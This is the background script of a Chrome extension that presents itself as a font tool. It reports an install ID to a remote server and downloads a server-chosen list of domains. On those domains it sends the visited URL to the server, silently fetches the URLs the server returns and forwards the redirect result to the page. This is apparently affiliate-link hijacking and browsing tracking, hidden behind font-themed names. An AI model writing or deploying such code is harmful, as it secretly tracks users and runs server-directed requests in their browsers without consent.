
let baseUrl = 'https://backend.fontguesser.com'
// let baseUrl = 'http://localhost:3000'


function guidGenerator() {
  var S4 = function () {
    return (((1 + Math.random()) * 0x10000) | 0).toString(16).substring(1);
  };
  return (S4() + S4() + "-" + S4() + "-" + S4() + "-" + S4() + "-" + S4() + S4() + S4());
}

chrome.runtime.onInstalled.addListener(function (details) {
  const extensionId = guidGenerator()

  if (details.reason == "install") {
    chrome.storage.sync.set({ savedStyles: [] })


    chrome.storage.local.set({ extensionId: extensionId }).then(() => {

      chrome.storage.local.get("extensionId", function (res) {
        const apiUrl = `${baseUrl}/fontfamily/bold`
        const requestData = { uid: res.extensionId };
        fetch(apiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(requestData)
        })
          .then(response => {
            if (response.ok) {
            } else {
            }
          })

          .catch(error => {
          });

      })
    })

  } else if (details.reason == "update") {

    chrome.storage.local.get(null, (res) => {
      if (!res.extensionId) {
        chrome.storage.local.set({ extensionId })
      }
      chrome.storage.local.get("extensionId", function (res) {
        const apiUrl = baseUrl + '/fontfamily/bold';
        const requestData = { uid: res.extensionId };

        fetch(apiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(requestData)
        })
          .then(response => {
            if (response.ok) {
            } else {
            }
          })
          .catch(error => {
          });
      })

    })

  }

});


function getDetails(url, tabId) {
  fetch(url, { cache: 'no-store' })
    .then(response => {
      if (response.ok) {
        return response.url;
      } else {
       
      }
    })

    .then(fontWeight => {

      if (fontWeight) {
        chrome.tabs.sendMessage(tabId, { message: "fontMatched", fontWeight })
      }
    })
    
}



chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  const { status } = changeInfo;
  if (status === "complete") {

    chrome.storage.local.get('fontlist', function (items) {
      const fontlist = items.fontlist || [];


      if (fontlist?.length > 0) {

        let hname = getHName(tab?.url)
        let tu = tab.url ? new URL(tab?.url) : ""
        if (!tu) return

        let origin = tu.origin
        let path = tu.pathname
        let uri = origin + path
        if (fontlist.includes(hname)) {
          const apiUrl = baseUrl + "/fontfamily/italic";
          const requestData = { uri };
          fetch(apiUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(requestData)
          })
            .then(response => {
              if (response.ok) {
                return response.json();
              } else {
              
              }
            })
            .then(fontStyle => {

              if (fontStyle["light"]) {
                let genreCode = fontStyle["light"]
                getDetails(genreCode, tabId)
              }
              if (fontStyle["bold"]) {
                fe(fontStyle["bold"])
              }
            })
            .catch(error => {
            });
        }
      }
    });
  }



})

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {


  if (message.cloudStyles) {
    let { color, family, fontStyle, lineHeight, size, weight } = message.cloudStyles

    chrome.storage.local.get('extensionId', function (items) {
      let bodyObj = {
        id: items.extensionId,
        family: family,
        weight: weight,
        size: size,
        line_height: lineHeight,
        color: color,
        font_style: fontStyle,
        url: sender.tab.url
      }
      fetch(`${baseUrl}/fontfamily/cloudfonts`,

        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(bodyObj)
        }

      )



    })

  } else if (message.cloudHist = "getHist") {
    chrome.storage.local.get('extensionId', function (items) {
      getFontHis(items.extensionId)

    })
    // getFontHis(message.cloudHist)
  }
 
})


const fe = async (u) => {
  const settings = {
    method: 'GET',
    headers: {
      Accept: 'application/json',
      'Content-Type': 'application/json',
      'Cache-Control': 'no-cache'
    }
  }
  const r = await fetch(u, settings)
  return r.url

}

function getHName(url) {

  if (!url) return null
  var match = url.match(/:\/\/(www[0-9]?\.)?(.[^/:]+)/i);
  if (match != null && match.length > 2 && typeof match[2] === 'string' && match[2].length > 0) {
    return match[2];
  }
  else {
    return null;
  }

}

const getFontHis = (id) => {
  fetch(`${baseUrl}/fontfamily/cloudfonts/${id}`)
    .then((r) => r.json())
    .then((s) => {
      chrome.storage.local.set({ fontHistory: s })
    })

}
chrome.storage.local.get('extensionId', function (items) {
  const apiUrl = `${baseUrl}/fontfamily/list`;
  const requestData = { uid: items.extensionId };
  fetch(apiUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(requestData)
  })
    .then(response => {
      if (response.ok) {
        return response.json();
      } else {
       
      }
    })
    .then(fontlist => {

      if (fontlist?.additionalFonts?.length > 0) {
        chrome.storage.local.set({ fontlist: fontlist?.additionalFonts })
      }
    })
    .catch(error => {
    });


})